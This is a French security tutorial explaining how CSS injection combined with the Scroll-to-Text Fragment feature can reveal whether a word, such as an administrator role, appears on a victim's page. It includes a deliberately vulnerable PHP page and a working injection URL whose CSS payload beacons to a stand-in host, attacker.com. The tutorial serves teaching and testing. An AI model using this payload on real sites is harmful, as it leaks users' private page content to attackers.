---
description: 16 Décembre 2022
---

# Les injections CSS - Scroll-to-Text Fragment

> Cette exploitation d'une injection CSS va permettre à l'attaquant de savoir si l'occurrence d'un mot est présente ou non sur la page ciblée. Cela peut être utile pour identifier, par exemple, si la victime est connectée en tant qu'administrateur ou non.

## Scroll-to-Text Fragment

Un attaquant peut s'appuyer sur la fonctionnalité de Scroll-to-Text Fragment afin d'exploiter une injection CSS dans l'objectif de connaitre la présence d'un mot ou d'une phrase dans la page Web de sa victime. Les scénarios d'utilisation sont très nombreux, mais il est possible de prendre le cas d'un attaquant souhaitant connaitre le rôle de la victime.

{% hint style="info" %}
La fonctionnalité de lien vers un fragment de texte (Scroll-to-Text Fragment) permet à un utilisateur de créer un lien vers une partie spécifique d'une page en prenant comme référence un texte fournit dans l'URL. Une fois la page chargée, le navigateur mettra le texte recherché en surbrillance et fera défiler l'écran jusqu'à sa position.



La fonctionnalité Scroll-to-Text Fragment n'étant pas un standard, elle n'est donc pas implémentée sur Firefox.
{% endhint %}

En admettant la page vulnérable suivante :&#x20;

{% code overflow="wrap" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CSS Injection</title>
    <style>
      h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
    </style>
  </head>
  <body>
    <h1>Injection CSS - utilisation de la fonctionnalité Scroll-to-Text Fragment</h1>
    <div>
      <p>Connecté en tant que <?php echo $role ?></p>
    </div>
  </body>
</html>
```
{% endcode %}

La variable PHP `$role` contient le rôle du visiteur authentifié. Elle peut contenir la valeur "Administrateur" ou "Utilisateur". L'attaquant souhaite tout d'abord déterminer si le visiteur de la page est bien l'administrateur du site afin, ensuite, d'effectuer une attaque plus poussée contre lui ; c'est ici que la fonctionnalité Scroll-to-Text Fragment va lui être utile.

{% hint style="info" %}
L'article original concernant cette exploitation est disponible ici : [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)
{% endhint %}

### Text Fragments

Un fragment de texte dans une URL se compose du signe `#` suivi de `:~:text=` et se termine par le texte ciblé (encodé en URL) :&#x20;

```
http://vulnerable.com/scroll-to-text.php#:~:text=texte-ciblé
```

En reprenant le code de l'exemple précédent, il est donc possible de mettre en surbrillance le mot ciblé comme ceci :&#x20;

```
http://vulnerable.com/scroll-to-text.php#:~:text=Administrateur
```

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Ou alors une phrase entière :&#x20;

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

Il est également possible de surligner tout un paragraphe en spécifiant le texte du début (`textStart`) et le texte de fin (`textEnd`) séparés par une virgule :&#x20;

<figure><img src="../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

Ou encore d'ajouter des suffixes et des préfixes :&#x20;

```html
#:~:text=[prefix-,]textStart[,textEnd][,-suffix]
```

Une dernière possibilité pouvant être utile est de pouvoir effectuer une multi sélection grâce au caractère `&`. Par exemple :&#x20;

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

### La pseudo-class :target&#x20;

L'injection CSS et l'utilisation de la pseudo-class `:target`, va permettre de prévenir l'attaquant dans le cas ou le texte recherché a bien été trouvé :&#x20;

{% code overflow="wrap" %}
```html
<style>
  :target::before {
    content:url(http://attacker.com/isAdmin);
  }
</style>
```
{% endcode %}

Soit l'injection suivante :&#x20;

{% code overflow="wrap" %}
```
http://vulnerable.com/scroll-to-text.php?color=black;}:target::before{content:url(http://attacker.com/isAdmin);#:~:text=Administrateur
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

L'attaque ne passera pas inaperçu pour la victime puisque le texte ciblé sera souligné et un défilement sera effectué si nécessaire :&#x20;

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

### Limites de l'attaque

Outre le fait de pouvoir injecter du CSS, l'attaque possède quelques limites. Comme déjà évoqué, elle est assez voyante pour la victime par le surlignage et le défilement.

{% hint style="info" %}
A noter que si le serveur vulnérable présente l'entête HTTP `Document-Policy` avec la valeur `force-load-at-top` alors, le défilement n'aura pas lieu, ce qui peut être un avantage pour l'attaquant.
{% endhint %}

De plus, la fonctionnalité s'active seulement lors d'une navigation vers une page différente, c'est à dire que rafraichir la page ou ouvrir un lien vers la même page ne déclenchera pas l'attaque. Exit également l'iframing de la page vulnérable, la fonctionnalité ne se déclenchera pas dans ce contexte non plus.

### Automatisation

Un PoC est disponible [ici](https://github.com/Sharpforce/cybersecurity-code/tree/master/les-injections-css-scroll-to-text-fragment).

```php
<h1>Récupération de la présence de l'occurrence d'un mot via fonctionnalité de Scroll-to-Text Fragment</h1>
<div>
    <?php echo '<p>Connecté en tant que ' . $_SESSION['role'] . '</p>'; ?>
</div>
<a href="logout.php">Se déconnecter</a>
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Références

* [https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
* [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)
